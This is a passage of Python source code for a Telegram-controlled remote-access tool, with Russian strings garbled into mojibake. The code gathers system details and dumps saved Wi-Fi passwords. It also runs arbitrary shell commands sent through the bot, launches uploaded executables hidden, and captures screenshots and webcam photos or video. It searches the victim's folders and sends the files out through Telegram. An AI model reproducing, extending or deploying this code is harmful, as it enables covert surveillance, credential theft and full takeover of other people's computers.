                out = subprocess.check_output('wmic path win32_VideoController get name', shell=True, encoding='cp866')
                lines = [l.strip() for l in out.split('\n') if l.strip() and 'Name' not in l]
                gpu_info = ', '.join(lines)
        except Exception as e:
            gpu_info = f'–û—à–∏–±–∫–∞: {e}'
    info['GPU'] = gpu_info
    # BIOS (—á–∞—Å—Ç–∏—á–Ω–æ)
    bios_info = 'N/A'
    if platform.system() == 'Windows' and wmi:
        try:
            c = wmi.WMI()
            bios = c.Win32_BIOS()[0]
            bios_info = f"{bios.Manufacturer} {bios.SMBIOSBIOSVersion} {bios.ReleaseDate}"
        except Exception as e:
            bios_info = f'–û—à–∏–±–∫–∞: {e}'
    info['BIOS'] = bios_info
    # === –î–∏—Å–∫–∏ ===
    try:
        disks = psutil.disk_partitions()
        disk_list = []
        for d in disks:
            try:
                usage = psutil.disk_usage(d.mountpoint)
                disk_list.append(f"{d.device} ({d.fstype}): {round(usage.total/(1024**3),1)}–ì–ë –≤—Å–µ–≥–æ, {round(usage.free/(1024**3),1)}–ì–ë —Å–≤–æ–±–æ–¥–Ω–æ")
            except Exception:
                disk_list.append(f"{d.device} ({d.fstype}): –æ—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞")
        info['–î–∏—Å–∫–∏'] = '\n'.join(disk_list)
    except Exception as e:
        info['–î–∏—Å–∫–∏'] = f'–û—à–∏–±–∫–∞: {e}'
    # –¢–∏–ø –¥–∏—Å–∫–æ–≤ (HDD/SSD)
    disk_types = []
    if platform.system() == 'Windows':
        try:
            out = os.popen('wmic diskdrive get model,mediatype').read()
            for line in out.split('\n'):
                if line.strip() and 'Model' not in line:
                    disk_types.append(line.strip())
            info['–¢–∏–ø—ã –¥–∏—Å–∫–æ–≤'] = '\n'.join(disk_types)
        except Exception as e:
            info['–¢–∏–ø—ã –¥–∏—Å–∫–æ–≤'] = f'–û—à–∏–±–∫–∞: {e}'
    # === –°–µ—Ç—å ===
    try:
        info['–õ–æ–∫–∞–ª—å–Ω—ã–π IP'] = socket.gethostbyname(socket.gethostname())
    except Exception as e:
        info['–õ–æ–∫–∞–ª—å–Ω—ã–π IP'] = f'–û—à–∏–±–∫–∞: {e}'
    try:
        info['MAC-–∞–¥—Ä–µ—Å'] = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    except Exception as e:
        info['MAC-–∞–¥—Ä–µ—Å'] = f'–û—à–∏–±–∫–∞: {e}'
    # –°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã
    try:
        adapters = psutil.net_if_addrs()
        info['–°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã'] = ', '.join(adapters.keys())
    except Exception as e:
        info['–°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã'] = f'–û—à–∏–±–∫–∞: {e}'
    # –ê–∫—Ç–∏–≤–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
    try:
        conns = psutil.net_connections()
        info['–ê–∫—Ç–∏–≤–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è'] = str(len(conns))
    except Exception as e:
        info['–ê–∫—Ç–∏–≤–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è'] = f'–û—à–∏–±–∫–∞: {e}'
    # Wi-Fi SSID (Windows)
    if platform.system() == 'Windows':
        try:
            out = subprocess.check_output('netsh wlan show interfaces', shell=True, encoding='cp866')
            ssid = None
            for line in out.split('\n'):
                if 'SSID' in line and 'BSSID' not in line:
                    ssid = line.split(':',1)[-1].strip()
                    break
            info['Wi-Fi SSID'] = ssid or 'N/A'
        except Exception as e:
            info['Wi-Fi SSID'] = f'–û—à–∏–±–∫–∞: {e}'
    return info

# === NEW REMOTE CONTROL FUNCTIONS ===

def system_shutdown():
    if platform.system() == "Windows":
        os.system("shutdown /s /t 1")
    else: # For Linux/macOS
        os.system("shutdown now")

def system_restart():
    if platform.system() == "Windows":
        os.system("shutdown /r /t 1")
    else:
        os.system("reboot")

def system_logout():
    if platform.system() == "Windows":
        os.system("shutdown /l")
        return None
    else:
        # This is more complex on Linux, depends on desktop environment
        return "–í—ã—Ö–æ–¥ –∏–∑ —Å–∏—Å—Ç–µ–º—ã –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ Windows."

def open_url_in_browser(url):
    webbrowser.open(url)

def execute_shell_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=120,
            encoding='cp866', # Common for Russian Windows console
            errors='ignore'
        )
        output = result.stdout + result.stderr
        return output if output else "Command executed with no output."
    except Exception as e:
        return f"Error executing command: {e}"

def run_hidden_process(path):
    try:
        if platform.system() == "Windows":
            # –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –±–µ–∑ —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –æ–∫–Ω–∞
            subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            # –ù–∞ Linux/macOS, '&' –∑–∞–ø—É—Å–∫–∞–µ—Ç –≤ —Ñ–æ–Ω–µ
            subprocess.Popen(f"{path} &", shell=True)
        return "–ü—Ä–æ—Ü–µ—Å—Å –∑–∞–ø—É—â–µ–Ω –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ."
    except Exception as e:
        return f"–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å: {e}"

def move_mouse(x, y):
    try:
        mouse = MouseController()
        mouse.position = (int(x), int(y))
        return f"Mouse moved to ({x}, {y})."
    except Exception as e:
        return f"Error moving mouse: {e}"

def click_mouse():
    try:
        mouse = MouseController()
        mouse.click(Button.left, 1)
        return "Mouse clicked."
    except Exception as e:
        return f"Error clicking mouse: {e}"

def type_with_keyboard(text):
    try:
        keyboard = KeyboardController()
        keyboard.type(text)
        return f"Typed text: {text}"
    except Exception as e:
        return f"Error typing: {e}"

def lock_workstation():
    if platform.system() == "Windows":
        ctypes.windll.user32.LockWorkStation()
        return "–≠–∫—Ä–∞–Ω –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω."
    return "–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —ç–∫—Ä–∞–Ω–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ Windows."

def text_to_speech_speak(text):
    if not pyttsx3:
        return "pyttsx3 library not installed. Cannot speak."
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        return "Text spoken."
    except Exception as e:
        return f"Error in text-to-speech: {e}"

def show_popup_message(text, title="Message"):
    if platform.system() == "Windows":
        ctypes.windll.user32.MessageBoxW(0, text, title, 0)
        return "Popup message shown."
    return "Popups are only supported on Windows."

def set_desktop_wallpaper(path):
    if platform.system() == "Windows":
        if not os.path.exists(path):
            return "–§–∞–π–ª –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω."
        # SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return "–û–±–æ–∏ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞ –∏–∑–º–µ–Ω–µ–Ω—ã."
    return "–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±–æ–µ–≤ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ Windows."

def get_wifi_passwords_list():
    if platform.system() != "Windows":
        return "Wi-Fi password extraction only works on Windows."
    
    try:
        profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True, encoding='cp866', errors='ignore')
        profile_names_raw = re.findall(r"(?:–í—Å–µ –ø—Ä–æ—Ñ–∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π|User profiles on interface.*?)\s*:\s*(.*)", profiles_data)
        
        if not profile_names_raw:
            return "No Wi-Fi profiles found."
        
        profile_names = profile_names_raw[0].split('\n')
        
        wifi_list = []
        for name_line in profile_names:
            name = name_line.strip()
            if not name: continue
            try:
                profile_info = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True, encoding='cp866', errors='ignore')
                password = re.search(r"(?:–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –∫–ª—é—á–∞|Key Content)\s*:\s*(.*)", profile_info)
                if password:
                    wifi_list.append(f"SSID: {name}\nPassword: {password.group(1).strip()}\n")
            except Exception:
                wifi_list.append(f"SSID: {name}\nPassword: (–Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å)\n")
                
        return "\n".join(wifi_list) if wifi_list else "–ù–µ –Ω–∞–π–¥–µ–Ω–æ –Ω–∏ –æ–¥–Ω–æ–≥–æ –ø—Ä–æ—Ñ–∏–ª—è Wi-Fi."
    except Exception as e:
        return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–∞—Ä–æ–ª–µ–π Wi-Fi: {e}"

def list_files_in_directory(path):
    if not os.path.isdir(path):
        return f"Error: Directory not found at '{path}'"
    try:
        items = os.listdir(path)
        if not items:
            return f"Directory is empty: '{path}'"
        
        files = []
        dirs = []
        for item in items:
            full_path = os.path.join(path, item)
            try:
                if os.path.isdir(full_path):
                    dirs.append(f"üìÅ {item}")
                else:
                    files.append(f"üìÑ {item}")
            except OSError:
                files.append(f"‚ùì {item} (access error)")

        
        output = ""
        if dirs:
            output += "Folders:\n" + "\n".join(sorted(dirs))
        if files:
            output += "\n\nFiles:\n" + "\n".join(sorted(files))

        return output
        
    except Exception as e:
        return f"Error listing directory '{path}': {e}"


# === TELEGRAM –ë–û–¢ ===
def telegram_bot_thread():
    global status_active
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    dp = updater.dispatcher

    def cmd_screen(update, context):
        ss = take_screenshot()
        if ss:
            context.bot.send_photo(chat_id=update.effective_chat.id, photo=ss)
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text="–ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç")

    def cmd_status(update, context):
        info = get_full_status_info()
        text = (
            'üñ•Ô∏è <b>–°–ò–°–¢–ï–ú–ê</b>\n'
            f'  üíª <b>–ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:</b> {info.get("–ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞", "N/A")}\n'
            f'  üë§ <b>–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</b> {info.get("–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", "N/A")}\n'
            f'  üè∑Ô∏è <b>–û–°:</b> {info.get("–û–°", "N/A")}\n'
            f'  üèπ <b>–†–∞–∑—Ä—è–¥–Ω–æ—Å—Ç—å:</b> {info.get("–†–∞–∑—Ä—è–¥–Ω–æ—Å—Ç—å", "N/A")}\n'
            f'  üåê <b>–Ø–∑—ã–∫ —Å–∏—Å—Ç–µ–º—ã:</b> {info.get("–Ø–∑—ã–∫ —Å–∏—Å—Ç–µ–º—ã", "N/A")}\n'
            f'  ‚è±Ô∏è <b>Uptime:</b> {info.get("Uptime", "N/A")}\n'
            f'  üèóÔ∏è <b>–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞:</b> {info.get("–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞", "N/A")}\n'
            '\n'
            'üß† <b>–û–ë–û–†–£–î–û–í–ê–ù–ò–ï</b>\n'
            f'  üñ≤Ô∏è <b>CPU:</b> {info.get("CPU", "N/A")}\n'
            f'  üß¨ <b>RAM:</b> {info.get("RAM", "N/A")}\n'
            f'  üéÆ <b>GPU:</b> {info.get("GPU", "N/A")}\n'
            f'  üè∑Ô∏è <b>BIOS:</b> {info.get("BIOS", "N/A")}\n'
            '\n'
            'üíæ <b>–î–ò–°–ö–ò</b>\n'
            f'  üíΩ <b>–î–∏—Å–∫–∏:</b>\n    {info.get("–î–∏—Å–∫–∏", "N/A").replace(chr(10), chr(10)+"    ")}\n'
            f'  üóÉÔ∏è <b>–¢–∏–ø—ã –¥–∏—Å–∫–æ–≤:</b>\n    {info.get("–¢–∏–ø—ã –¥–∏—Å–∫–æ–≤", "N/A").replace(chr(10), chr(10)+"    ")}\n'
            '\n'
            'üåê <b>–°–ï–¢–¨</b>\n'
            f'  üè† <b>–õ–æ–∫–∞–ª—å–Ω—ã–π IP:</b> {info.get("–õ–æ–∫–∞–ª—å–Ω—ã–π IP", "N/A")}\n'
            f'  üÜî <b>MAC-–∞–¥—Ä–µ—Å:</b> {info.get("MAC-–∞–¥—Ä–µ—Å", "N/A")}\n'
            f'  üåâ <b>–°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã:</b> {info.get("–°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã", "N/A")}\n'
            f'  üîó <b>–ê–∫—Ç–∏–≤–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è:</b> {info.get("–ê–∫—Ç–∏–≤–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è", "N/A")}\n'
            f'  üåê <b>Wi-Fi SSID:</b> {info.get("Wi-Fi SSID", "N/A")}\n'
        )
        context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='HTML')

    def cmd_help(update, context):
        text = (
            "--- üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞ ---\n"
            "/status ‚Äî –ø–æ–¥—Ä–æ–±–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ\n"
            "/stop ‚Äî –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∏ –∑–∞–∫—Ä—ã—Ç—å –ø–æ–º–æ—â–Ω–∏–∫\n"
            "/shutdown ‚Äî –≤—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä\n"
            "/restart ‚Äî –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä\n"
            "/logout ‚Äî –≤—ã–π—Ç–∏ –∏–∑ —Å–∏—Å—Ç–µ–º—ã Windows\n"
            "/lock ‚Äî –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —ç–∫—Ä–∞–Ω\n"
            "\n"
            "--- üìÇ –§–∞–π–ª—ã –∏ –î–∞–Ω–Ω—ã–µ ---\n"
            "/screen ‚Äî —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞\n"
            "/webcam ‚Äî —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã\n"
            "/webcam [sec] ‚Äî –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã (–¥–æ 60 —Å–µ–∫)\n"
            "/archive <–∏–º—è_—Ñ–∞–π–ª–∞> [–∏–º—è_2]... ‚Äî –Ω–∞–π—Ç–∏ —Ñ–∞–π–ª—ã –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤ –∞—Ä—Ö–∏–≤–µ\n"
            "/wifi ‚Äî –ø–æ–ª—É—á–∏—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ Wi-Fi (Windows)\n"
            "/ls [path] ‚Äî —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –∏ –ø–∞–ø–æ–∫ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏\n"
            "\n"
            "--- ‚öôÔ∏è –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ ---\n"
            "/shell <cmd> ‚Äî –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –≤ shell\n"
            "/open_url <url> ‚Äî –æ—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ\n"
            "/run_hidden <path> ‚Äî –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É/—Ñ–∞–π–ª —Å–∫—Ä—ã—Ç–æ\n"
            "   (–û—Ç–ø—Ä–∞–≤—å—Ç–µ .exe —Ñ–∞–π–ª –±–æ—Ç—É, —á—Ç–æ–±—ã –∑–∞–≥—Ä—É–∑–∏—Ç—å –µ–≥–æ)\n"
            "\n"
            "--- ‚å®Ô∏è –í–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ ---\n"
            "/mousemove <x> <y> ‚Äî –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –º—ã—à—å\n"
            "/mouseclick ‚Äî –Ω–∞–∂–∞—Ç—å –ª–µ–≤—É—é –∫–Ω–æ–ø–∫—É –º—ã—à–∏\n"
            "/type <text> ‚Äî –Ω–∞–ø–µ—á–∞—Ç–∞—Ç—å —Ç–µ–∫—Å—Ç\n"
            "/speak <text> ‚Äî –æ–∑–≤—É—á–∏—Ç—å —Ç–µ–∫—Å—Ç –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ\n"
            "/popup <text> ‚Äî –ø–æ–∫–∞–∑–∞—Ç—å –≤—Å–ø–ª—ã–≤–∞—é—â–µ–µ –æ–∫–Ω–æ (Windows)\n"
            "/wallpaper ‚Äî —Å–º–µ–Ω–∏—Ç—å –æ–±–æ–∏ (–æ—Ç–≤–µ—Ç–æ–º –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ)\n"
        )
        context.bot.send_message(chat_id=update.effective_chat.id, text=text)

    def cmd_webcam(update, context):
        args = context.args
        if args and args[0].isdigit():
            seconds = int(args[0])
            if seconds < 1 or seconds > 60:
                context.bot.send_message(chat_id=update.effective_chat.id, text="–£–∫–∞–∂–∏—Ç–µ –≤—Ä–µ–º—è –æ—Ç 1 –¥–æ 60 —Å–µ–∫—É–Ω–¥")
                return
            video_path = capture_webcam(duration=seconds)
            if video_path and os.path.exists(video_path):
                with open(video_path, 'rb') as f:
                    context.bot.send_video(chat_id=update.effective_chat.id, video=f, timeout=120)
                os.remove(video_path)
            else:
                context.bot.send_message(chat_id=update.effective_chat.id, text="–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —Å –∫–∞–º–µ—Ä—ã")
        else:
            photo = capture_webcam()
            if photo:
                context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo)
            else:
                context.bot.send_message(chat_id=update.effective_chat.id, text="–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –∫–∞–º–µ—Ä—ã")

    def cmd_archive(update, context):
        if not context.args:
            update.message.reply_text("–û—à–∏–±–∫–∞: –£–∫–∞–∂–∏—Ç–µ –∏–º—è –∏–ª–∏ –º–∞—Å–∫—É —Ñ–∞–π–ª–∞ –¥–ª—è –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏.\n–ü—Ä–∏–º–µ—Ä: `/archive my_doc.txt *.jpg`", parse_mode='Markdown')
            return

        names = ' '.join(context.args).replace(',', ' ').split()
        search_paths = [
            os.path.join(os.path.expanduser('~'), 'Desktop'),
            os.path.join(os.path.expanduser('~'), 'Documents'),
            os.path.join(os.path.expanduser('~'), 'Downloads'),
            'C:\\'
        ]
        found_files = []
        for name in names:
            # –ï—Å–ª–∏ –∞–±—Å–æ–ª—é—Ç–Ω—ã–π –ø—É—Ç—å
            if os.path.isabs(name) and os.path.isfile(name):
                if name not in found_files:
                    found_files.append(name)
            else:
                # –ü–æ–∏—Å–∫ –ø–æ –ø–∞–ø–∫–∞–º
                for base in search_paths:
                    try:
                        for root, _, files in os.walk(base):
                            for file in files:
                                # –§–∏–ª—å—Ç—Ä –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö/—Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
                                if (
                                    name.lower() in file.lower()
                                    and not file.lower().endswith('.zip')
                                    and 'temp' not in root.lower()
                                    and not file.lower().startswith('rar$')
                                    and '.rartemp' not in root.lower()
                                ):
                                    full_path = os.path.join(root, file)
                                    if full_path not in found_files:
                                        found_files.append(full_path)
                    except Exception:
                        continue # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–∞–ø–∫–∏, –∫ –∫–æ—Ç–æ—Ä—ã–º –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞
        if not found_files:
            update.message.reply_text("–§–∞–π–ª—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –ø–æ –≤–∞—à–µ–º—É –∑–∞–ø—Ä–æ—Å—É.")
            return

        archive_name = f"custom_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        archive_path = os.path.join(OUTPUT_DIR, archive_name)
        try:
            with pyzipper.AESZipFile(archive_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
                zipf.setpassword(ZIP_PASSWORD.encode('utf-8'))
                for file_path in found_files:
                    zipf.write(file_path, arcname=os.path.basename(file_path))
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞
            if os.path.getsize(archive_path) > 50 * 1024 * 1024:
                context.bot.send_message(chat_id=update.effective_chat.id, text="–û—à–∏–±–∫–∞: –ê—Ä—Ö–∏–≤ —Å–ª–∏—à–∫–æ–º –≤–µ–ª–∏–∫ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ (>50–ú–ë).")
            else:
                with open(archive_path, 'rb') as archive_file:
                    context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=archive_file,
                        filename=archive_name,
                        caption=f"–ê—Ä—Ö–∏–≤ —Å –∑–∞–ø—Ä–æ—à–µ–Ω–Ω—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏.\n–ü–∞—Ä–æ–ª—å: `{ZIP_PASSWORD}`",
                        parse_mode='Markdown'
                    )
            
            os.remove(archive_path)
        except Exception as e:
            context.bot.send_message(chat_id=update.effective_chat.id, text=f"–û—à–∏–±–∫–∞ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏: {e}")

    def cmd_stop(update, context):
        """–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –±–æ—Ç–∞ –∏ –∑–∞–≤–µ—Ä—à–∞–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞."""
        context.bot.send_message(chat_id=update.effective_chat.id, text="–ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ –Ω–∞ –æ—Å—Ç–∞–Ω–æ–≤–∫—É. –ü–æ–º–æ—â–Ω–∏–∫ –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Ä–∞–±–æ—Ç—É...")
        updater.stop()
        os._exit(0) # –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –≤—Å–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞

    # --- NEW COMMANDS ---
    def cmd_shutdown(update, context):
        update.message.reply_text("Executing shutdown...")
        system_shutdown()
    
    def cmd_restart(update, context):
        update.message.reply_text("Executing restart...")
        system_restart()
        
    def cmd_logout(update, context):
        result = system_logout()
        if result: # On error
            update.message.reply_text(result)
        else:
            update.message.reply_text("Executing logout...")

    def cmd_open_url(update, context):
        if not context.args:
            update.message.reply_text("Usage: /open_url <URL>")
            return
        url = context.args[0]
        if not url.startswith('http'):
            url = 'http://' + url
        open_url_in_browser(url)
        update.message.reply_text(f"Opening URL: {url}")

    def cmd_shell(update, context):
        if not context.args:
            update.message.reply_text("Usage: /shell <command>")
            return
        command = ' '.join(context.args)
        update.message.reply_text(f"Executing: {command}\n...")
        output = execute_shell_command(command)
        if len(output) > 4096:
            # Split message if too long for Telegram
            for i in range(0, len(output), 4096):
                context.bot.send_message(chat_id=update.effective_chat.id, text=output[i:i + 4096])
        else:
            context.bot.send_message(chat_id=update.effective_chat.id, text=output)

    def cmd_run_hidden(update, context):
        if not context.args:
            update.message.reply_text("Usage: /run_hidden <path_to_exe>")
            return
        path = ' '.join(context.args)
        result = run_hidden_process(path)
        update.message.reply_text(result)

    def cmd_mousemove(update, context):
        if len(context.args) != 2 or not context.args[0].isdigit() or not context.args[1].isdigit():
            update.message.reply_text("Usage: /mousemove <x> <y>")
            return
        x, y = context.args
        result = move_mouse(x, y)
        update.message.reply_text(result)

    def cmd_mouseclick(update, context):
        result = click_mouse()
        update.message.reply_text(result)

    def cmd_type(update, context):
        if not context.args:
            update.message.reply_text("Usage: /type <text to type>")
            return
        text = ' '.join(context.args)
        result = type_with_keyboard(text)
        update.message.reply_text(result)
    
    def cmd_lock(update, context):
        result = lock_workstation()
        update.message.reply_text(result)

    def cmd_speak(update, context):
        if not pyttsx3:
            update.message.reply_text("Library pyttsx3 is not installed. Please install it (`pip install pyttsx3`).")
            return
        if not context.args:
            update.message.reply_text("Usage: /speak <text to say>")
            return
        text = ' '.join(context.args)
        result = text_to_speech_speak(text)
        update.message.reply_text(result)

    def cmd_popup(update, context):
        if not context.args:
            update.message.reply_text("Usage: /popup <message text>")
            return
        text = ' '.join(context.args)
        result = show_popup_message(text)
        update.message.reply_text(result)

    def cmd_wallpaper(update, context):
        if not update.message.reply_to_message or not update.message.reply_to_message.photo:
            update.message.reply_text("Please reply to a photo to set it as wallpaper.")
            return
        
        photo = update.message.reply_to_message.photo[-1] # Get highest resolution
        file_id = photo.file_id
        photo_file = context.bot.get_file(file_id)
        
        now = datetime.now().strftime('%Y%m%d_%H%M%S')
        file_name = f"wallpaper_{now}.jpg"
        wallpaper_path = os.path.join(OUTPUT_DIR, file_name)
        
        photo_file.download(wallpaper_path)
        
        result = set_desktop_wallpaper(wallpaper_path)
        update.message.reply_text(result)
        
        # Clean up the downloaded file
        safe_remove(wallpaper_path)

    def cmd_wifi(update, context):
        update.message.reply_text("Fetching Wi-Fi passwords...")
        passwords = get_wifi_passwords_list()
        update.message.reply_text(passwords)

    def cmd_ls(update, context):
        path = ' '.join(context.args) if context.args else '.'
        result = list_files_in_directory(path)
        update.message.reply_text(f"Listing for '{os.path.abspath(path)}':\n\n{result}")

    def handle_file_upload(update, context):
        if update.message.document:
            file_obj = update.message.document
        elif update.message.audio:
            file_obj = update.message.audio
        elif update.message.video:
            file_obj = update.message.video
        else:
            return

        # –õ–∏–º–∏—Ç API Telegram –Ω–∞ –∑–∞–≥—Ä—É–∑–∫—É —Ñ–∞–π–ª–æ–≤ –±–æ—Ç–æ–º - 20 –ú–ë
        if file_obj.file_size and file_obj.file_size > 20 * 1024 * 1024:
            update.message.reply_text("–û—à–∏–±–∫–∞: –§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π. –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ - 20 –ú–ë.")
            return

        try:
            file_id = file_obj.file_id
            tg_file = context.bot.get_file(file_id)
            file_name = file_obj.file_name

            save_path = os.path.join(OUTPUT_DIR, file_name)
            tg_file.download(save_path)

            reply_text = f"–§–∞–π–ª '{file_name}' —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω –≤:\n`{save_path}`"

            # –ï—Å–ª–∏ —ç—Ç–æ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª Windows, –ø—Ä–µ–¥–ª–∞–≥–∞–µ–º –∫–æ–º–∞–Ω–¥—É /run_hidden
            if file_name.lower().endswith('.exe'):
                reply_text += f"\n\n–ß—Ç–æ–±—ã –∑–∞–ø—É—Å—Ç–∏—Ç—å –µ–≥–æ —Å–∫—Ä—ã—Ç–æ, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ:\n`/run_hidden \"{save_path}\"`"

            update.message.reply_text(reply_text, parse_mode='Markdown')

        except telegram.error.BadRequest as e:
            if "file is too big" in str(e).lower():
                update.message.reply_text("–û—à–∏–±–∫–∞: –§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π. –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ - 20 –ú–ë.")
            else:
                update.message.reply_text(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ Telegram: {e}")
        except Exception as e:
            update.message.reply_text(f"–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª: {e}")

    # --- HANDLERS ---
